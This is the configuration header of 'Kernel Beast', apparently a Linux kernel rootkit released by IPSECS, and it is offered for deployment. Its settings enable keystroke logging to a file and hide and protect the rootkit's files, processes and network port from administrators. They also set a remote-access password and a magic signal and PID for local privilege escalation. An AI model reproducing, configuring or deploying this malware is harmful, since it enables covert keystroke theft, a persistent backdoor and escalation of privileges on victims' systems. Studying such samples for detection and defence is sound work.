/*
Kernel Beast Ver #1.0 - Configuration File
Copyright Ph03n1X of IPSECS (c) 2011
Get more research of ours http://ipsecs.com
*/

/*Don't change this line*/
#define TRUE 1
#define FALSE 0

/*
Enable keylog probably makes the system unstable
But worth to be tried
*/
#define _KEYLOG_ TRUE

/*Define your module & network daemon name*/
#define KBEAST "kbeast"

/*
All files, dirs, process will be hidden
Protected from deletion & being killed
*/
#define _H4X0R_ "_h4x_"

/*
Directory where your rootkit will be saved
You have to use _H4X0R_ in your directory name
No slash (/) at the end
*/
#define _H4X_PATH_ "/usr/_h4x_"

/*
File to save key logged data
*/
#define _LOGFILE_ "acctlog"

/*
This port will be hidded from netstat
*/
#define _HIDE_PORT_ 13377

/*
Password for remote access
*/
#define _RPASSWORD_ "h4x3d"
#define _MAGIC_NAME_ "bin"
/*
Magic signal & pid for local escalation
*/
#define _MAGIC_SIG_ 37 //kill signal
#define _MAGIC_PID_ 31337 //kill this pid
